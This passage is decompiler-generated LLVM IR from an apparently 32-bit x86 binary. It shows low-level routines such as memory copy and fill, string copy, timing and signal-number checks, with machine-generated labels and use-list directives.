  %v1_8051974 = inttoptr i32 %v1_805196f to i32*
  store i32 12, i32* %v1_8051974, align 4
  br label %dec_label_pc_805197a

dec_label_pc_805197a:                             ; preds = %dec_label_pc_80518ef, %dec_label_pc_8051966
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805198b

dec_label_pc_805197e:                             ; preds = %dec_label_pc_8051944
  %v0_8051980 = load i32, i32* @ebx, align 4
  %v1_8051980 = add i32 %v0_8051980, 24
  store i32 %v1_8051980, i32* %eax.global-to-local, align 4
  store i32 %v1_8051980, i32* %stack_var_-124, align 4
  %v1_8051986 = call i32 @function_8053377(i32 %v1_8051980)
  store i32 %v1_8051986, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805198b

dec_label_pc_805198b:                             ; preds = %dec_label_pc_805197a, %dec_label_pc_805197e
  br label %dec_label_pc_805198e

dec_label_pc_805198e:                             ; preds = %dec_label_pc_80518a6, %dec_label_pc_805198b
  %v0_8051991 = load i32, i32* @ebx, align 4
  store i32 %v0_8051991, i32* %eax.global-to-local, align 4
  ret i32 %v0_8051991

; uselistorder directives
  uselistorder i32 %v3_805194b, { 1, 0, 2 }
  uselistorder i32 %v1_805190a, { 2, 3, 5, 4, 1, 0, 6 }
  uselistorder i32 %v1_80518ef, { 1, 0, 2 }
  uselistorder i32 %v3_80518b7, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_80525c2, { 1, 0 }
  uselistorder i32 (i32)* @function_80514e3, { 6, 5, 4, 13, 12, 11, 3, 8, 2, 7, 1, 0, 10, 9 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805198e, { 1, 0 }
  uselistorder label %dec_label_pc_805198b, { 1, 0 }
  uselistorder label %dec_label_pc_805197a, { 1, 0 }
  uselistorder label %dec_label_pc_8051966, { 1, 0 }
  uselistorder label %dec_label_pc_8051944, { 1, 0 }
}

define i32 @function_8051997(i32* %arg1) local_unnamed_addr {
dec_label_pc_8051997:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_80519a0 = add i32 %tmp3, 24
  store i32 %v1_80519a0, i32* @ebx, align 4
  %v2_80519a9 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80519a9, i32* @eax, align 4
  %v2_80519ae = call i32 @function_805337a(i32 %v2_80519a9, i32 134558583)
  %v0_80519b3 = load i32, i32* @ebx, align 4
  %v1_80519b6 = call i32 @function_8053377(i32 %v0_80519b3)
  br label %dec_label_pc_80519be

dec_label_pc_80519be:                             ; preds = %dec_label_pc_80519e9, %dec_label_pc_8051997
  %v0_80519be = load i32, i32* @esi, align 4
  %v1_80519be = add i32 %v0_80519be, 8
  %v2_80519be = inttoptr i32 %v1_80519be to i32*
  %v3_80519be = load i32, i32* %v2_80519be, align 4
  %v2_80519c1 = add i32 %v0_80519be, 4
  %v3_80519c1 = inttoptr i32 %v2_80519c1 to i32*
  %v4_80519c1 = load i32, i32* %v3_80519c1, align 4
  %v6_80519c4 = icmp ugt i32 %v3_80519be, %v4_80519c1
  br i1 %v6_80519c4, label %dec_label_pc_80519e9, label %dec_label_pc_80519c6

dec_label_pc_80519c6:                             ; preds = %dec_label_pc_80519be
  %v0_80519c6 = load i32, i32* @edx, align 4
  %v1_80519c7 = add i32 %v0_80519be, 20
  %v2_80519c7 = inttoptr i32 %v1_80519c7 to i32*
  %v3_80519c7 = load i32, i32* %v2_80519c7, align 4
  %v1_80519ca = add i32 %v0_80519be, 12
  %v2_80519ca = inttoptr i32 %v1_80519ca to i32*
  %v3_80519ca = load i32, i32* %v2_80519ca, align 4
  %v1_80519cd = inttoptr i32 %v0_80519be to i32*
  %v2_80519cd = load i32, i32* %v1_80519cd, align 4
  %v4_80519cf = call i32 @function_80537ba(i32 %v2_80519cd, i32 %v3_80519ca, i32 %v3_80519c7, i32 %v0_80519c6)
  %tmp13 = icmp slt i32 %v4_80519cf, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80519df, label %dec_label_pc_80519db

dec_label_pc_80519db:                             ; preds = %dec_label_pc_80519c6
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051a05

dec_label_pc_80519df:                             ; preds = %dec_label_pc_80519c6
  %v1_80519df = load i32, i32* @esi, align 4
  %v2_80519df = add i32 %v1_80519df, 8
  %v3_80519df = inttoptr i32 %v2_80519df to i32*
  store i32 %v4_80519cf, i32* %v3_80519df, align 4
  %v0_80519e2 = load i32, i32* @esi, align 4
  %v1_80519e2 = add i32 %v0_80519e2, 4
  %v2_80519e2 = inttoptr i32 %v1_80519e2 to i32*
  store i32 0, i32* %v2_80519e2, align 4
  %v0_80519e9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80519e9

dec_label_pc_80519e9:                             ; preds = %dec_label_pc_80519be, %dec_label_pc_80519df
  %v1_80519f7 = phi i32 [ %v0_80519be, %dec_label_pc_80519be ], [ %v0_80519e9.pre, %dec_label_pc_80519df ]
  %v1_80519e9 = add i32 %v1_80519f7, 4
  %v2_80519e9 = inttoptr i32 %v1_80519e9 to i32*
  %v3_80519e9 = load i32, i32* %v2_80519e9, align 4
  %v2_80519ee = add i32 %v1_80519f7, 12
  %v3_80519ee = inttoptr i32 %v2_80519ee to i32*
  %v4_80519ee = load i32, i32* %v3_80519ee, align 4
  %v5_80519ee = add i32 %v4_80519ee, %v3_80519e9
  store i32 %v5_80519ee, i32* @ebx, align 4
  %v1_80519f1 = add i32 %v5_80519ee, 8
  %v2_80519f1 = inttoptr i32 %v1_80519f1 to i16*
  %v3_80519f1 = load i16, i16* %v2_80519f1, align 2
  %v4_80519f1 = zext i16 %v3_80519f1 to i32
  store i32 %v4_80519f1, i32* @edx, align 4
  %v2_80519f5 = add i32 %v4_80519f1, %v3_80519e9
  store i32 %v2_80519f5, i32* %v2_80519e9, align 4
  %v0_80519fa = load i32, i32* @ebx, align 4
  %v1_80519fa = add i32 %v0_80519fa, 4
  %v2_80519fa = inttoptr i32 %v1_80519fa to i32*
  %v3_80519fa = load i32, i32* %v2_80519fa, align 4
  %v1_80519fd = load i32, i32* @esi, align 4
  %v2_80519fd = add i32 %v1_80519fd, 16
  %v3_80519fd = inttoptr i32 %v2_80519fd to i32*
  store i32 %v3_80519fa, i32* %v3_80519fd, align 4
  %v0_8051a00 = load i32, i32* @ebx, align 4
  %v1_8051a00 = inttoptr i32 %v0_8051a00 to i32*
  %v2_8051a00 = load i32, i32* %v1_8051a00, align 4
  %v3_8051a00 = icmp eq i32 %v2_8051a00, 0
  br i1 %v3_8051a00, label %dec_label_pc_80519be, label %dec_label_pc_8051a05.loopexit

dec_label_pc_8051a05.loopexit:                    ; preds = %dec_label_pc_80519e9
  br label %dec_label_pc_8051a05

dec_label_pc_8051a05:                             ; preds = %dec_label_pc_8051a05.loopexit, %dec_label_pc_80519db
  store i32 %v2_80519a9, i32* @eax, align 4
  %v2_8051a0e = call i32 @function_805337a(i32 %v2_80519a9, i32 1)
  %v0_8051a13 = load i32, i32* @ebx, align 4
  ret i32 %v0_8051a13

; uselistorder directives
  uselistorder i32 %v1_80519f7, { 1, 0 }
  uselistorder i32 %v0_80519be, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_80519e9, { 1, 0 }
}

define i32 @function_8051a1b(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051a1b:
  ret i32 ptrtoint (i32* @global_var_80556f4.30 to i32)
}

define i32 @function_8051a21() local_unnamed_addr {
dec_label_pc_8051a21:
  %tmp = call i64 @__decompiler_undefined_function_4()
  %stack_var_-16 = alloca i32, align 4
  %v1_8051a29 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8051a29 = call i32 @function_8053b8f(%tms* %v1_8051a29)
  %v4_8051a2e = trunc i64 %tmp to i32
  %v4_8051a32 = load i32, i32* %stack_var_-16, align 4
  %v5_8051a32 = add i32 %v4_8051a32, %v4_8051a2e
  %v3_8051a39 = mul i32 %v5_8051a32, 10000
  %v1_8051a3f = and i32 %v3_8051a39, 2147483632
  ret i32 %v1_8051a3f

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8051a45(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051a45:
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051a46 = load i32, i32* @esi, align 4
  store i32 %v0_8051a46, i32* %stack_var_-8, align 4
  %v4_8051a47 = ptrtoint i8* %arg1 to i32
  %v9_8051a53 = icmp ugt i8* %tmp4, %arg1
  %v1_8051a55 = icmp eq i1 %v9_8051a53, false
  br i1 %v1_8051a55, label %dec_label_pc_8051a5d, label %dec_label_pc_8051a57

dec_label_pc_8051a57:                             ; preds = %dec_label_pc_8051a45
  %v7_8051a59 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %arg3)
  br label %dec_label_pc_8051a69

dec_label_pc_8051a5d:                             ; preds = %dec_label_pc_8051a45
  %v3_8051a5d = add i32 %arg2, -1
  %v4_8051a5d = add i32 %v3_8051a5d, %arg3
  %v5_8051a5d = inttoptr i32 %v4_8051a5d to i8*
  %v3_8051a61 = add i32 %v4_8051a47, -1
  %v4_8051a61 = add i32 %v3_8051a61, %arg3
  %v5_8051a61 = inttoptr i32 %v4_8051a61 to i8*
  %v7_8051a66 = call i8* @_memcpy(i8* %v5_8051a61, i8* %v5_8051a5d, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8051a69

dec_label_pc_8051a69:                             ; preds = %dec_label_pc_8051a57, %dec_label_pc_8051a5d
  %v2_8051a69 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051a69, i32* @esi, align 4
  ret i32 %v4_8051a47

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051a69, { 1, 0 }
}

define i32 @function_8051a6c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051a6c:
  %v0_8051a6c = load i32, i32* @edi, align 4
  %v4_8051a75 = ptrtoint i8* %arg1 to i32
  %v5_8051a79 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_8051a6c, i32* @edi, align 4
  ret i32 %v4_8051a75

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_8051a81(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051a81:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051a82 = load i32, i32* @esi, align 4
  store i32 %v0_8051a82, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051a8a = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051a8a, i32* %edi.global-to-local, align 4
  %v4_8051a8e.pre = load i32, i32* @eax, align 4
  %v8_8051a8e.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051a8e

dec_label_pc_8051a8e:                             ; preds = %dec_label_pc_8051a8e.dec_label_pc_8051a8e_crit_edge, %dec_label_pc_8051a81
  %v2_8051a8f = phi i32 [ %v7_8051a8f, %dec_label_pc_8051a8e.dec_label_pc_8051a8e_crit_edge ], [ %v4_8051a8a, %dec_label_pc_8051a81 ]
  %v8_8051a8e = phi i1 [ %v5_8051a8f, %dec_label_pc_8051a8e.dec_label_pc_8051a8e_crit_edge ], [ %v8_8051a8e.pre, %dec_label_pc_8051a81 ]
  %v4_8051a8e = phi i32 [ %v0_8051a90, %dec_label_pc_8051a8e.dec_label_pc_8051a8e_crit_edge ], [ %v4_8051a8e.pre, %dec_label_pc_8051a81 ]
  %v7_8051a8e = phi i32 [ %v0_8051a8e.pre, %dec_label_pc_8051a8e.dec_label_pc_8051a8e_crit_edge ], [ %arg2, %dec_label_pc_8051a81 ]
  %v1_8051a8e = inttoptr i32 %v7_8051a8e to i8*
  %v2_8051a8e = load i8, i8* %v1_8051a8e, align 1
  %v3_8051a8e = zext i8 %v2_8051a8e to i32
  %v5_8051a8e = and i32 %v4_8051a8e, -256
  %v6_8051a8e = or i32 %v3_8051a8e, %v5_8051a8e
  store i32 %v6_8051a8e, i32* %eax.global-to-local, align 4
  %v9_8051a8e = select i1 %v8_8051a8e, i32 -1, i32 1
  %v10_8051a8e = add i32 %v7_8051a8e, %v9_8051a8e
  store i32 %v10_8051a8e, i32* %esi.global-to-local, align 4
  %v3_8051a8f = inttoptr i32 %v2_8051a8f to i8*
  store i8 %v2_8051a8e, i8* %v3_8051a8f, align 1
  %v4_8051a8f = load i32, i32* %edi.global-to-local, align 4
  %v5_8051a8f = load i1, i1* @df, align 1
  %v6_8051a8f = select i1 %v5_8051a8f, i32 -1, i32 1
  %v7_8051a8f = add i32 %v6_8051a8f, %v4_8051a8f
  store i32 %v7_8051a8f, i32* %edi.global-to-local, align 4
  %v0_8051a90 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051a90 = trunc i32 %v0_8051a90 to i8
  %v4_8051a90 = icmp eq i8 %v3_8051a90, 0
  %v1_8051a92 = icmp eq i1 %v4_8051a90, false
  br i1 %v1_8051a92, label %dec_label_pc_8051a8e.dec_label_pc_8051a8e_crit_edge, label %dec_label_pc_8051a94

dec_label_pc_8051a8e.dec_label_pc_8051a8e_crit_edge: ; preds = %dec_label_pc_8051a8e
  %v0_8051a8e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051a8e

dec_label_pc_8051a94:                             ; preds = %dec_label_pc_8051a8e
  store i32 %v4_8051a8a, i32* %eax.global-to-local, align 4
  %v2_8051a99 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051a99, i32* %esi.global-to-local, align 4
  ret i32 %v4_8051a8a

; uselistorder directives
  uselistorder i32 %v0_8051a90, { 1, 0 }
  uselistorder i32 %v7_8051a8f, { 1, 0 }
  uselistorder i1 %v5_8051a8f, { 1, 0 }
  uselistorder i32 %v4_8051a8a, { 1, 2, 0, 3 }
}

define i32 @function_8051a9c() local_unnamed_addr {
dec_label_pc_8051a9c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v2_8051a9f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8051aa8 = inttoptr i32 %tmp to i8*
  %v3_8051aa8 = call i32 @function_8053c61(i8* %v2_8051aa8, i32 %v2_8051a9f)
  %v1_8051ab3 = icmp eq i32 %v3_8051aa8, 0
  br i1 %v1_8051ab3, label %dec_label_pc_8051abb, label %dec_label_pc_8051ab7

dec_label_pc_8051ab7:                             ; preds = %dec_label_pc_8051a9c
  %v3_8051ab7 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051abb

dec_label_pc_8051abb:                             ; preds = %dec_label_pc_8051a9c, %dec_label_pc_8051ab7
  %v0_8051abb = phi i32 [ -1, %dec_label_pc_8051a9c ], [ %v3_8051ab7, %dec_label_pc_8051ab7 ]
  ret i32 %v0_8051abb

; uselistorder directives
  uselistorder label %dec_label_pc_8051abb, { 1, 0 }
}

define i32 @function_8051ac1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051ac1:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051adc = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051ae3 = call i32 @function_80536ab(i32 2, i32 %v2_8051adc)
  ret i32 %v2_8051ae3

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8051aec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051aec:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051b07 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051b0e = call i32 @function_80536ab(i32 3, i32 %v2_8051b07)
  ret i32 %v2_8051b0e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8051b17(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051b17:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051b32 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051b39 = call i32 @function_80536ab(i32 6, i32 %v2_8051b32)
  ret i32 %v2_8051b39

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8051b42() local_unnamed_addr {
dec_label_pc_8051b42:
  %stack_var_-20 = alloca i32, align 4
  %v2_8051b6d = ptrtoint i32* %stack_var_-20 to i32
  %v2_8051b74 = call i32 @function_80536ab(i32 15, i32 %v2_8051b6d)
  ret i32 %v2_8051b74
}

define i32 @function_8051b7d(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051b7d:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_8051b90 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8051b97 = call i32 @function_80536ab(i32 4, i32 %v2_8051b90)
  ret i32 %v2_8051b97

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_8051ba0() local_unnamed_addr {
dec_label_pc_8051ba0:
  %stack_var_-16 = alloca i32, align 4
  %v2_8051bc3 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8051bca = call i32 @function_80536ab(i32 10, i32 %v2_8051bc3)
  ret i32 %v2_8051bca
}

define i32 @function_8051bd3() local_unnamed_addr {
dec_label_pc_8051bd3:
  %stack_var_-24 = alloca i32, align 4
  %v2_8051c06 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8051c0d = call i32 @function_80536ab(i32 12, i32 %v2_8051c06)
  ret i32 %v2_8051c0d
}

define i32 @function_8051c16() local_unnamed_addr {
dec_label_pc_8051c16:
  %stack_var_-16 = alloca i32, align 4
  %v2_8051c39 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8051c40 = call i32 @function_80536ab(i32 9, i32 %v2_8051c39)
  ret i32 %v2_8051c40
}

define i32 @function_8051c49() local_unnamed_addr {
dec_label_pc_8051c49:
  %stack_var_-24 = alloca i32, align 4
  %v2_8051c7c = ptrtoint i32* %stack_var_-24 to i32
  %v2_8051c83 = call i32 @function_80536ab(i32 11, i32 %v2_8051c7c)
  ret i32 %v2_8051c83
}

define i32 @function_8051c8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8051c8c:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8051cb7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8051cbe = call i32 @function_80536ab(i32 14, i32 %v2_8051cb7)
  ret i32 %v2_8051cbe

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8051cc7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051cc7:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051ce2 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051ce9 = call i32 @function_80536ab(i32 1, i32 %v2_8051ce2)
  ret i32 %v2_8051ce9

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_80536ab, { 5, 10, 4, 6, 3, 2, 9, 1, 7, 0, 8 }
}

define i32 @function_8051cf2(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051cf2:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8051d0a, label %dec_label_pc_8051cfd

dec_label_pc_8051cfd:                             ; preds = %dec_label_pc_8051cf2
  %v1_8051cfd = add i32 %arg1, -64
  %v3_8051cfd = sub i32 63, %arg1
  %v4_8051cfd = and i32 %v3_8051cfd, %arg1
  %v5_8051cfd = icmp slt i32 %v4_8051cfd, 0
  %v6_8051cfd = icmp eq i32 %v1_8051cfd, 0
  %v7_8051cfd = icmp slt i32 %v1_8051cfd, 0
  %v3_8051d00 = icmp eq i1 %v7_8051cfd, %v5_8051cfd
  %v4_8051d00 = icmp eq i1 %v6_8051cfd, false
  %v5_8051d00 = and i1 %v4_8051d00, %v3_8051d00
  br i1 %v5_8051d00, label %dec_label_pc_8051d0a, label %dec_label_pc_8051d02

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051cfd
  %v4_8051d05 = call i32 @function_8051e08(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8051d0a

dec_label_pc_8051d0a:                             ; preds = %dec_label_pc_8051cfd, %dec_label_pc_8051cf2, %dec_label_pc_8051d02
  %v1_8051d0a = call i32 @function_8051a1b(i32 ptrtoint (i32* @0 to i32))
  %v1_8051d0f = inttoptr i32 %v1_8051d0a to i32*
  store i32 22, i32* %v1_8051d0f, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8051cfd, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051d0a, { 2, 0, 1 }
}

define i32 @function_8051d1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051d1c:
  %v3_8051d2a = inttoptr i32 %arg1 to i8*
  %v4_8051d2a = call i32 @function_8051a6c(i8* %v3_8051d2a, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8051d35(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051d35:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8051d35 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8051d4a = icmp eq i32 %arg2, -1
  %arg1.off = add i32 %arg1, -1
  %tmp35 = icmp ugt i32 %arg1.off, 63
  %tmp36 = or i1 %tmp35, %v10_8051d4a
  br i1 %tmp36, label %dec_label_pc_8051d58, label %dec_label_pc_8051d73.lr.ph

dec_label_pc_8051d58:                             ; preds = %dec_label_pc_8051d35
  %v1_8051d58 = call i32 @function_8051a1b(i32 %v0_8051d35)
  store i32 %v1_8051d58, i32* %eax.global-to-local, align 4
  %v1_8051d5d = inttoptr i32 %v1_8051d58 to i32*
  store i32 22, i32* %v1_8051d5d, align 4
  br label %dec_label_pc_8051ddc

dec_label_pc_8051d73.lr.ph:                       ; preds = %dec_label_pc_8051d35
  %v15_8051d36 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8051d7328 = add i32 %v15_8051d36, 284
  %v5_8051d7329 = inttoptr i32 %v4_8051d7328 to i32*
  store i32 0, i32* %v5_8051d7329, align 4
  %v0_8051d7e30 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d7e31 = add i32 %v0_8051d7e30, -1
  %v9_8051d7e32 = icmp slt i32 %v1_8051d7e31, 0
  store i32 %v1_8051d7e31, i32* %eax.global-to-local, align 4
  %v1_8051d7f33 = icmp eq i1 %v9_8051d7e32, false
  br i1 %v1_8051d7f33, label %dec_label_pc_8051d73.dec_label_pc_8051d73_crit_edge, label %dec_label_pc_8051d81

dec_label_pc_8051d73.dec_label_pc_8051d73_crit_edge: ; preds = %dec_label_pc_8051d73.lr.ph, %dec_label_pc_8051d73.dec_label_pc_8051d73_crit_edge
  %v1_8051d7e34 = phi i32 [ %v1_8051d7e, %dec_label_pc_8051d73.dec_label_pc_8051d73_crit_edge ], [ %v1_8051d7e31, %dec_label_pc_8051d73.lr.ph ]
  %v0_8051d73.pre = load i32, i32* @esp, align 4
  %v2_8051d73 = mul i32 %v1_8051d7e34, 4
  %v3_8051d73 = add i32 %v0_8051d73.pre, 160
  %v4_8051d73 = add i32 %v3_8051d73, %v2_8051d73
  %v5_8051d73 = inttoptr i32 %v4_8051d73 to i32*
  store i32 0, i32* %v5_8051d73, align 4
  %v0_8051d7e = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d7e = add i32 %v0_8051d7e, -1
  %v9_8051d7e = icmp slt i32 %v1_8051d7e, 0
  store i32 %v1_8051d7e, i32* %eax.global-to-local, align 4
  %v1_8051d7f = icmp eq i1 %v9_8051d7e, false
  br i1 %v1_8051d7f, label %dec_label_pc_8051d73.dec_label_pc_8051d73_crit_edge, label %dec_label_pc_8051d81

dec_label_pc_8051d81:                             ; preds = %dec_label_pc_8051d73.dec_label_pc_8051d73_crit_edge, %dec_label_pc_8051d73.lr.ph
  %v0_8051d81 = load i32, i32* @edx, align 4
  %v2_8051d84 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8051d84, i32* %eax.global-to-local, align 4
  %v4_8051d8c = call i32 @function_8051e08(i32 %v2_8051d84, i32 %arg1, i32 %v0_8051d81, i32 %v0_8051d81)
  store i32 %v4_8051d8c, i32* %eax.global-to-local, align 4
  %v2_8051d94 = icmp slt i32 %v4_8051d8c, 0
  br i1 %v2_8051d94, label %dec_label_pc_8051ddc, label %dec_label_pc_8051d98

dec_label_pc_8051d98:                             ; preds = %dec_label_pc_8051d81
  %v4_8051da0 = call i32 @function_8051de4(i32 ptrtoint (i32* @global_var_8055840.31 to i32), i32 %arg1, i32 %v4_8051d8c, i32 %v4_8051d8c)
  %v2_8051db9 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8051dbe = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8051dbe, i32* %eax.global-to-local, align 4
  %v4_8051dc7 = call i32 @function_80535b7(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8051db9)
  store i32 %v4_8051dc7, i32* %eax.global-to-local, align 4
  %v2_8051dcf = icmp slt i32 %v4_8051dc7, 0
  %v3_8051dd3 = load i32, i32* %stack_var_-284, align 4
  %.v3_8051dd3 = select i1 %v2_8051dcf, i32 -1, i32 %v3_8051dd3
  br label %dec_label_pc_8051ddc

dec_label_pc_8051ddc:                             ; preds = %dec_label_pc_8051d98, %dec_label_pc_8051d58, %dec_label_pc_8051d81
  %storemerge = phi i32 [ -1, %dec_label_pc_8051d81 ], [ -1, %dec_label_pc_8051d58 ], [ %.v3_8051dd3, %dec_label_pc_8051d98 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8051d7e, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 10, 11, 7, 8 }
  uselistorder i32 284, { 0, 4, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8051ddc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051d73.dec_label_pc_8051d73_crit_edge, { 1, 0 }
}

define i32 @function_8051de4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051de4:
  %v1_8051df2 = add i32 %arg2, -1
  %v1_8051df5 = urem i32 %v1_8051df2, 32
  %v2_8051df5 = icmp eq i32 %v1_8051df5, 0
  %v2_8051df8 = udiv i32 %v1_8051df2, 32
  br i1 %v2_8051df5, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051de4
  %v5_8051dfb = shl i32 1, %v1_8051df5
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051de4, %bb
  %v6_8051dfd = phi i32 [ 1, %dec_label_pc_8051de4 ], [ %v5_8051dfb, %bb ]
  %v2_8051dfd = mul nuw nsw i32 %v2_8051df8, 4
  %v3_8051dfd = add i32 %v2_8051dfd, %arg1
  %v4_8051dfd = inttoptr i32 %v3_8051dfd to i32*
  %v5_8051dfd = load i32, i32* %v4_8051dfd, align 4
  %v7_8051dfd = and i32 %v5_8051dfd, %v6_8051dfd
  %v8_8051dfd = icmp eq i32 %v7_8051dfd, 0
  %v1_8051e01 = icmp eq i1 %v8_8051dfd, false
  %v2_8051e01 = zext i1 %v1_8051e01 to i32
  ret i32 %v2_8051e01

; uselistorder directives
  uselistorder i32 %v1_8051df5, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8051e08(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051e08:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e08 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e08, i32* %stack_var_-4, align 4
  %v1_8051e16 = add i32 %arg2, -1
  %v1_8051e19 = urem i32 %v1_8051e16, 32
  %v2_8051e19 = icmp eq i32 %v1_8051e19, 0
  store i32 %v1_8051e19, i32* @ecx, align 4
  %v2_8051e1c = udiv i32 %v1_8051e16, 32
